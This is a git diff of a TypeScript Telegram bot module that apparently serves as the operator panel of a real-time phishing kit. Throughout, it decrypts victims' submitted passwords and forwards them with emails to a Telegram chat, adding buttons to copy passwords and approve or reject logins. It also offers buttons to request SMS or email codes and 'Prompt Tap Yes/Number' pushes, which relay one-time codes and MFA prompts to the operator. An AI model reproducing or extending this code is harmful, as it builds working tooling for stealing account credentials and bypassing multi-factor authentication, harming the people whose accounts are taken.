@@ -1,27 +1,30 @@
-import { bot } from "../clients/grammy.client.js";
-import { Lead, providerNames } from "../schemas/lead.schemas.js";
-import { InlineKeyboard } from "grammy";
+import { Context, GrammyError, InlineKeyboard } from "grammy";
+import { Update } from "grammy/types";
 import { constants, privateDecrypt } from "node:crypto";
-import {
-  LeadSessionState,
-  restartLeadSession,
-  updateLeadSession,
-} from "./lead.methods.js";
+import { bot } from "../clients/grammy.client.js";
 import {
   callbackActions,
-  reviewCallbackData,
+  sanitizeCallbackData,
   sanitizeCallbackDataField,
 } from "./callback.methods.js";
-import { sendSessionToTelegram } from "./session.methods.js";
-import { Update } from "grammy/types";
+import {
+  LeadSession,
+  writeLeadSession,
+  updateLeadSession,
+} from "./lead.methods.js";
+import { composeMessage } from "./message.methods.js";
+import { isProductionRuntime } from "./runtime.methods.js";
+import { AuthLead, Lead, providerNames } from "../schemas/lead.schemas.js";
 
-const EXPIRED_SESSION_MESSAGE = "Session expired. Reload page and try again.";
-const UNREADABLE_CREDENTIALS_MESSAGE =
-  "We couldn't read those credentials. Reload the page and try again.";
+const TELEGRAM_EXPIRED_SESSION_MESSAGE =
+  "Session expired. Reload page and try again.";
 
-export function isProductionRuntime(): boolean {
-  return Boolean(process.env.VERCEL) || process.env.NODE_ENV === "production";
-}
+const TELEGRAM_STALE_MESSAGE_EDIT_HINTS = [
+  "message to edit not found",
+  "message can't be editted",
+  "message_id_invalid",
+  "there is no text in the message to edit",
+];
 
 export function getTelegramMode(): "webhook" | "polling" | "disabled" {
   const configured = process.env.TELEGRAM_MODE?.trim().toLowerCase();
@@ -87,11 +90,247 @@ export function canReadTelegramUpdate(value: unknown): value is Update {
   return false;
 }
 
-function decryptAuthToken(authToken: string): string {
+export async function sendMessageToTelegram(
+  message: string,
+  options:
+    | {
+        context: Context;
+        keyboard?: InlineKeyboard;
+      }
+    | {
+        chatId: number;
+        keyboard?: InlineKeyboard;
+      },
+): Promise<{ messageId: number }> {
+  if ("context" in options) {
+    const result = await options.context.reply(message, {
+      link_preview_options: { is_disabled: true },
+      reply_markup: options.keyboard,
+    });
+    return { messageId: result.message_id };
+  } else {
+    const result = await bot.api.sendMessage(options.chatId, message, {
+      link_preview_options: { is_disabled: true },
+      reply_markup: options.keyboard,
+    });
+    return { messageId: result.message_id };
+  }
+}
+
+export async function sendSessionToTelegram(
+  session: LeadSession,
+  options?: {
+    resend?: true;
+    context?: Context;
+    keyboard?: InlineKeyboard;
+    logEntry?: string | string[];
+  },
+): Promise<LeadSession> {
+  async function safelyRun(
+    callback: () => Promise<unknown>,
+    runLabel: string,
+  ): Promise<"edited" | "stale"> {
+    try {
+      await callback();
+      return "edited";
+    } catch (error) {
+      if (!(error instanceof GrammyError)) throw error;
+      const description = error.description.toLowerCase();
+      if (description.includes("message is not modified")) return "edited";
+      if (
+        TELEGRAM_STALE_MESSAGE_EDIT_HINTS.some((hint) =>
+          description.includes(hint),
+        )
+      ) {
+        console.warn(
+          `[telegram] ${runLabel} is no longer editable; resending.`,
+        );
+        return "stale";
+      }
+      console.error(
+        `[telegram] ${runLabel} failed (${error.error_code}): ${error.description}`,
+      );
+      throw error;
+    }
+  }
+  const chatId = session.chatId || process.env.TELEGRAM_CHAT_ID;
+  if (!chatId) throw new Error("Telegram chat ID is not configured.");
+  const message = composeMessage(
+    session.notification,
+    session.credentials,
+    session.logs,
+    ...(Array.isArray(options?.logEntry)
+      ? options.logEntry
+      : options?.logEntry
+        ? [options.logEntry]
+        : []),
+  );
+  if (!message) throw new Error("Nothing to send: session has no content.");
+  const replyMarkup = options?.keyboard ?? session.keyboard;
+  const savedMarkup = replyMarkup
+    ? { inline_keyboard: replyMarkup.inline_keyboard }
+    : null;
+  const ctx = options?.context;
+  const ctxMessageId = ctx?.message?.message_id;
+  if (
+    !options?.resend &&
+    ctxMessageId !== undefined &&
+    ctx?.message?.from?.id === ctx?.me?.id
+  ) {
+    const outcome = await safelyRun(
+      () =>
+        ctx!.editMessageText(message, {
+          link_preview_options: { is_disabled: true },
+          reply_markup: savedMarkup ?? undefined,
+        }),
+      "edit context message",
+    );
+    if (outcome === "edited") {
+      const result = { messageId: ctxMessageId!, keyboard: savedMarkup };
+      const updated = await updateLeadSession(session.sessionId, result);
+      if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
+      return updated;
+    }
+  }
+  if (
+    !options?.resend &&
+    session.messageId &&
+    session.messageId !== ctxMessageId
+  ) {
+    const outcome = await safelyRun(
+      () =>
+        bot.api.editMessageText(chatId, session.messageId!, message, {
+          link_preview_options: { is_disabled: true },
+          reply_markup: savedMarkup ?? undefined,
+        }),
+      `edit session message ${session.messageId}`,
+    );
+    if (outcome === "edited") {
+      const result = { messageId: session.messageId, keyboard: savedMarkup };
+      const updated = await updateLeadSession(session.sessionId, result);
+      if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
+      return updated;
+    }
+  }
+  const stale = new Set<number>();
+  if (session.messageId) stale.add(session.messageId);
+  if (options?.resend && ctxMessageId) stale.add(ctxMessageId);
+  for (const id of stale) {
+    try {
+      if (id === ctxMessageId && ctx) await ctx.deleteMessage();
+      else await bot.api.deleteMessage(chatId, id);
+    } catch (error) {
+      console.warn(
+        `[telegram] could not delete stale message ${id}:`,
+        error instanceof GrammyError ? error.description : error,
+      );
+    }
+  }
+  const apiResult = await bot.api.sendMessage(chatId, message, {
+    link_preview_options: { is_disabled: true },
+    reply_markup: savedMarkup ?? undefined,
+  });
+  const result = { messageId: apiResult.message_id, keyboard: savedMarkup };
+  const updated = await updateLeadSession(session.sessionId, result);
+  if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
+  return updated;
+}
+
+export function buildLeadSessionKeyboardForTelegram(session: LeadSession) {
+  let keyboard = new InlineKeyboard();
+  if (!session.overload.includes("sms-code")) {
+    keyboard = keyboard
+      .text(
+        "SMS Code",
+        sanitizeCallbackData(session.sessionId, callbackActions.smsCode),
+      )
+      .row();
+  }
+  if (!session.overload.includes("email-code")) {
+    keyboard = keyboard
+      .text(
+        "Email Code",
+        sanitizeCallbackData(session.sessionId, callbackActions.emailCode),
+      )
+      .row();
+  }
+  if (!session.overload.includes("email-link")) {
+    keyboard = keyboard
+      .text(
+        "Email Link",
+        sanitizeCallbackData(session.sessionId, callbackActions.emailLink),
+      )
+      .row();
+  }
+  if (!session.overload.includes("prompt-yes")) {
+    keyboard = keyboard
+      .text(
+        "Prompt Tap Yes",
+        sanitizeCallbackData(session.sessionId, callbackActions.promptYes),
+      )
+      .row();
+  }
+  if (!session.overload.includes("prompt-num")) {
+    keyboard = keyboard
+      .text(
+        "Prompt Tap Number",
+        sanitizeCallbackData(session.sessionId, callbackActions.promptNum()),
+      )
+      .row();
+  }
+  return keyboard
+    .text(
+      "Restart",
+      sanitizeCallbackData(session.sessionId, callbackActions.restart),
+    )
+    .primary()
+    .text(
+      "Complete",
+      sanitizeCallbackData(session.sessionId, callbackActions.complete),
+    )
+    .success();
+}
+
+export async function sendLeadSessionToTelegram(
+  sessionId: string,
+  lead: Lead,
+): Promise<LeadSession> {
   const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
+  const unreadableCredentialMessage =
+    "We couldn't read those credentials. Reload the page and try again.";
   if (!privateKey) {
     console.error("PHOENYX_PRIVATE_KEY is not configured.");
-    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
+    throw new Error(unreadableCredentialMessage);
+  }
+  const email = sanitizeCallbackDataField(lead.email);
+  const session = await updateLeadSession(sessionId, {
+    credentials: [
+      `Provider - ${providerNames[lead.provider]}`,
+      `Email - ${email}`,
+    ]
+      .filter(Boolean)
+      .join("\n\n"),
+  });
+  if (!session) {
+    console.error("Invalid sessionId or expired session.");
+    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
+  }
+  return await sendSessionToTelegram(session, {
+    resend: true,
+    keyboard: new InlineKeyboard().copyText("Copy email", lead.email),
+  });
+}
+
+export async function sendAuthLeadSessionToTelegram(
+  sessionId: string,
+  authLead: AuthLead,
+): Promise<LeadSession> {
+  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
+  const unreadableCredentialMessage =
+    "We couldn't read those credentials. Reload the page and try again.";
+  if (!privateKey) {
+    console.error("PHOENYX_PRIVATE_KEY is not configured.");
+    throw new Error(unreadableCredentialMessage);
   }
   let decrypted: Buffer;
   try {
@@ -101,81 +340,78 @@ function decryptAuthToken(authToken: string): string {
         padding: constants.RSA_PKCS1_OAEP_PADDING,
         oaepHash: "sha256",
       },
-      Buffer.from(authToken, "base64"),
+      Buffer.from(authLead.authToken, "base64"),
     );
   } catch (error) {
     console.error("Could not decrypt the lead auth token:", error);
-    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
+    throw new Error(unreadableCredentialMessage);
   }
-  const password = decrypted.toString("utf8");
-  if (!password.trim()) {
+  const decryptedPass = decrypted.toString("utf8");
+  if (!decryptedPass.trim()) {
     console.error("Decrypted lead auth token is empty.");
-    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
+    throw new Error(unreadableCredentialMessage);
   }
-  return password;
-}
-
-export async function requestTelegramLeadReview(
-  sessionId: string,
-  lead: Lead,
-): Promise<LeadSessionState> {
-  const decryptedPass = decryptAuthToken(lead.authToken);
-  const email = sanitizeCallbackDataField(lead.email);
+  const email = sanitizeCallbackDataField(authLead.email);
   const password = sanitizeCallbackDataField(decryptedPass);
-  await restartLeadSession(sessionId, {
+  const customFieldName = sanitizeCallbackDataField(
+    authLead.customField?.name ?? "",
+  );
+  const customFieldValue = sanitizeCallbackDataField(
+    authLead.customField?.value ?? "",
+  );
+  await writeLeadSession(sessionId, {
     status: "loading",
-    keepMessageId: true,
+    keepStanding: true,
   });
   const session = await updateLeadSession(sessionId, {
     status: "loading",
     process: "auth",
     feedback: "Authenticating your credentials...",
     credentials: [
-      `Provider - ${providerNames[lead.provider]}`,
+      `Provider - ${providerNames[authLead.provider]}`,
       `Email - ${email}`,
       `Password - ${password}`,
-      lead.customField &&
-        `${sanitizeCallbackDataField(lead.customField.name)} - ${sanitizeCallbackDataField(lead.customField.value)}`,
+      authLead.customField && `${customFieldName} - ${customFieldValue}`,
     ]
       .filter(Boolean)
       .join("\n\n"),
   });
   if (!session) {
     console.error("Invalid sessionId or expired session.");
-    throw Error(EXPIRED_SESSION_MESSAGE);
+    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
   }
-  const result = await sendSessionToTelegram(session, {
+  return await sendSessionToTelegram(session, {
     resend: true,
-    inlineKeyboard: new InlineKeyboard()
-      .copyText("Copy email", lead.email)
+    keyboard: new InlineKeyboard()
+      .copyText("Copy email", authLead.email)
       .row()
       .copyText("Copy password", decryptedPass)
       .row()
       .text(
         "❌ Invalid Email",
-        reviewCallbackData(sessionId, callbackActions.authFlagEmail),
+        sanitizeCallbackData(sessionId, callbackActions.authFlagEmail),
       )
       .row()
-      .text("Reject", reviewCallbackData(sessionId, callbackActions.authReject))
+      .text(
+        "Reject",
+        sanitizeCallbackData(sessionId, callbackActions.authReject),
+      )
       .danger()
       .text(
         "Approve",
-        reviewCallbackData(sessionId, callbackActions.authApprove),
+        sanitizeCallbackData(sessionId, callbackActions.authApprove),
       )
       .success(),
   });
-  const updated = await updateLeadSession(sessionId, result);
-  if (!updated) throw Error(EXPIRED_SESSION_MESSAGE);
-  return updated;
 }
 
-export async function requestTelegramCodeLeadReview(
+export async function sendCodeLeadSessionToTelegram(
   sessionId: string,
   codeLead: {
     type: "sms" | "email";
     code: string;
   },
-): Promise<LeadSessionState> {
+): Promise<LeadSession> {
   const sms = codeLead.type === "sms";
   const session = await updateLeadSession(sessionId, {
     status: "loading",
@@ -185,16 +421,16 @@ export async function requestTelegramCodeLeadReview(
   });
   if (!session) {
     console.error("Invalid sessionId or expired session.");
-    throw Error(EXPIRED_SESSION_MESSAGE);
+    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
   }
-  const result = await sendSessionToTelegram(session, {
+  return await sendSessionToTelegram(session, {
     resend: true,
-    inlineKeyboard: new InlineKeyboard()
+    keyboard: new InlineKeyboard()
       .copyText("Copy code", codeLead.code)
       .row()
       .text(
         "Reject",
-        reviewCallbackData(
+        sanitizeCallbackData(
           sessionId,
           sms
             ? callbackActions.verifySmsReject
@@ -204,7 +440,7 @@ export async function requestTelegramCodeLeadReview(
       .danger()
       .text(
         "Approve",
-        reviewCallbackData(
+        sanitizeCallbackData(
           sessionId,
           sms
             ? callbackActions.verifySmsApprove
@@ -213,9 +449,6 @@ export async function requestTelegramCodeLeadReview(
       )
       .success(),
   });
-  const updated = await updateLeadSession(sessionId, result);
-  if (!updated) throw Error(EXPIRED_SESSION_MESSAGE);
-  return updated;
 }
 
 export async function startTelegramPolling(): Promise<void> {
